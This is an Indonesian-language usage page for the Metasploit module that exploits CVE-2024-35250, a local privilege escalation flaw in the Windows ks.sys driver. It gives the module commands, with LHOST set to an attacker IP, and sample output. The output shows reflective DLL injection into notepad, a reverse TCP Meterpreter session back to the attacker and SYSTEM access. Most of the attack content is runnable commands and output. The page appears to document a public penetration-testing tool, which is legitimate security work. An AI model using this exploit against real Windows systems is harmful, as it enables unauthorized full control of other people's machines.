# cve_2024_35250_ks_driver

Driver `ks.sys` pada Windows adalah salah satu komponen inti dari Kernel Streaming dan secara default terinstal di semua sistem. Terdapat sebuah kerentanan `Local Privilege Escalation` (`LPE`) dalam driver ini yang dapat dieksploitasi pada berbagai versi `Windows 10`, `Windows 11`, dan `Windows Server 2022` yang terbaru.

## Penulis
- AngelBoy
- varwara
- jheysel-r7

## Platform
- `Windows`
  
## Arsitektur
- `x64`

## Cara Penggunaan di Metasploit

```
use exploit/windows/local/cve_2024_35250_ks_driver
set PAYLOAD <PAYLOAD>
set SESSION <ID>
set LHOST <IP_ATTACKER>
set LPORT <PORT_LISTENER>
set TARGET <ID>
set VERBOSE true
```

Hasil output-nya seperti ini:

```
[*] Started reverse TCP handler on 192.168.1.11:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Windows Build Number = 10.0.22000.0
[+] The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows 11 version 21H2
[*] Launching notepad to host the exploit...
[*] The notepad path is: C:\Windows\System32\notepad.exe
[*] The notepad pid is: 6648
[*] Reflectively injecting the DLL into 6648...
[*] Sending stage (203846 bytes) to 192.168.1.55
[*] Meterpreter session 11 opened (192.168.1.11:4444 -> 192.168.1.55:49785) at 2025-05-17 21:42:51 +0700

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
```

## Referensi
- [Rapid7](https://www.rapid7.com/db/modules/exploit/windows/local/cve_2024_35250_ks_driver/)
